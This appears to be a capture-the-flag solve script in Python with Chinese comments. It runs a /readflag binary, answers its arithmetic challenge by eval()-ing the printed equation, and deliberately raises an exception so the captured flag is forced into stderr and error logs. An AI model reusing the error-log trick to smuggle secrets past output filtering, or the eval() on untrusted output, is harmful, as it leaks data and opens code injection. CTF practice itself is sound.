import subprocess
import re
import sys
import time
import os

def log_stderr(msg):
    # 强制写入 stderr
    sys.stderr.write(f"[EXP] {msg}\n")
    sys.stderr.flush()

def solve():
    log_stderr("Exploit script STARTED! 正在尝试运行 /readflag")
    
    try:
        if not os.path.exists("/readflag"):
            log_stderr("错误: 找不到 /readflag 文件")
            return

        # 启动进程
        p = subprocess.Popen(
            ["/readflag"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=0
        )

        buffer = ""
        log_stderr("Process started. Reading output...")

        while True:
            char = p.stdout.read(1)
            if not char: break
            buffer += char
            # 实时回显到 stderr，防止被吞
            sys.stderr.write(char)
            sys.stderr.flush()

            if "input your answer:" in buffer:
                break
        
        # 提取算式
        content = buffer.replace("input your answer:", "").strip()
        match = re.search(r'[\d\+\-\*\/\(\)\s]+$', content)
        
        if match:
            equation = match.group(0).strip()
            log_stderr(f"找到算式: {equation}")
            
            # 计算并发送
            answer = int(eval(equation))
            log_stderr(f"计算结果: {answer}")
            p.stdin.write(f"{answer}\n")
            p.stdin.flush()
            
            # 读取剩余输出（Flag）
            rest = p.stdout.read()
            log_stderr(f"最终输出:\n{rest}")
            
            # 【大招】抛出异常，强制让 Flag 出现在错误日志里
            if "flag{" in rest:
                raise Exception(f"SUCCESS_FLAG_IS_HERE: {rest}")
        else:
            log_stderr("未找到算式，buffer内容: " + buffer)

    except Exception as e:
        log_stderr(f"发生异常: {e}")
        # 如果是成功拿到的 Flag，这里也会打印一遍
        sys.stderr.write(f"\n[!!!] CRITICAL ERROR (FLAG?): {e}\n")

if __name__ == "__main__":
    solve()
